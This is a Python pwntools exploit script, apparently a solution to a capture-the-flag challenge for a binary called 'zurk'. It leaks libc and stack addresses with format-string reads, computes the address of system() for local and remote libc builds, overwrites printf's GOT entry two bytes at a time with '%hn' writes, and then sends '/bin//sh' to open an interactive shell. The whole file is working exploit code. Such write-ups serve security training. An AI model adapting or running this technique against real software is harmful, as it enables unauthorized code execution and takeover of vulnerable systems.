#!/usr/bin/env python3
from pwn import *

proc = process('./zurk')
#proc = remote("binary.utctf.live", 9003)
printf_got_1 = p64(0x601022)
printf_got_2 = p64(0x601020)

for _ in range(4):
    print(proc.recvline())

gdb.attach(proc, '''
b *do_move+157
''')

#leak libc and get system address
proc.sendline('%17$p')
libc_start_main = proc.recvline().decode().split(' ')[0]
libc_start_main = int(libc_start_main, 16) - 231
#libc_base = libc_start_main - 0x20740 #remote
libc_base = libc_start_main - 0x21ab0 #local
#system = libc_base + 0x45390 #remote
system = libc_base + 0x4f440 #local
str_system = str(hex(system))[2:]
print(str_system)

#break into 2 byte components
sys_1 = int(str_system[4:8], 16) - 0x16 #16 bytes already written
sys_2 = int(str_system[8:12], 16) - sys_1 - 0x16 #math to get next address right

#leak previous stack frame
proc.recvline()
proc.sendline('%14$p')
prev_f = proc.recvline().decode().split(' ')[0]
prev_f = int(prev_f, 16)
curr_f = prev_f - 0x50
print("stack addr: "+hex(curr_f))

#write system address to printf GOT entry, 2 bytes at a time proc.recvline()
p = printf_got_1 + printf_got_2 
p += b'%' + str(sys_1).encode() + b'%6$hn'
p += b'%' + str(sys_2).encode() + b'%7$hn'

input()
proc.sendline(p)
print("payload")

#pass /bin/sh to printf (now system)
print(proc.recvline())
print(proc.recvline())
proc.sendline('/bin//sh')
input()
proc.interactive()
